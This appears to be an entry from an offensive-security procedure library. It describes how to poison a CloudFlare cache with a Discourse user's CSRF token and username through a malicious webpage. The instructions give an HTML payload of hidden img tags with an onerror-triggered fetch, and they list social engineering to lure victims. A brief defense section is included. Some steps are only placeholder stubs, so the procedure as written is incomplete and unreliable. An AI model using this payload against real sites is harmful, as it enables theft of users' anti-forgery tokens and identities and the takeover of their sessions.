---
tags:
  - drive-by
  - javascript
  - cache-poisoning
type: procedure
tools:
  - '[[tools/JavaScript-for-Client-Side-Exploitation]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:24.441Z'
sub_techniques: []
id: 9287bfa6-6be2-43e1-ad28-4aaef78d33e3
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Taint CloudFlare Cache Using Victim's Browser

## Summary

This procedure uses a malicious webpage to trick the victim's authenticated browser into requesting and caching user-specific .css URLs, poisoning the CloudFlare cache with their CSRF token and username.

## Description

The victim visits an attacker-controlled page containing <img> tags with src=/u/$rand.css (random $rand). The browser fetches these, caching the responses regionally. An onerror handler on the third img triggers JavaScript to proceed, ensuring completion.

## Requirements

1. Hosted malicious HTML page
2. Victim authenticated to Discourse
3. Social engineering to lure victim

## Defense

Defensive measures and detection strategies:

- Educate users on phishing/malicious links
- Implement CSP to block img src to internal paths
- Monitor for anomalous img requests from user agents

## Objectives

1. Force victim browser to taint cache
2. Ensure requests complete via onerror
3. Transition to extraction phase

## Instructions

### Step 1: Host Malicious Page

**Context**: Create HTML with img tags to trigger requests.

No command; embed in page:
```html
<img src="/u/123.css" style="display:none;"><img src="/u/456.css" style="display:none;"><img src="/u/789.css" style="display:none;" onerror="f();" />
<script>function f() { fetch('?fetch=1&f=789').then(r => r.text()).then(t => { /* handle */ }); }</script>
```

> Victim loads page; browser requests URLs, tainting cache.

### Step 2: Handle Completion

**Context**: onerror calls function to fetch extracted data.

**Command** (JavaScript):
```javascript
function f() { /* JS to proceed to server fetch */ }
```

> Triggers client-side retrieval post-taint.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/JavaScript-for-Client-Side-Exploitation]]

## Tags

- [[drive-by]]
- [[JavaScript]]
- [[cache-poisoning]]
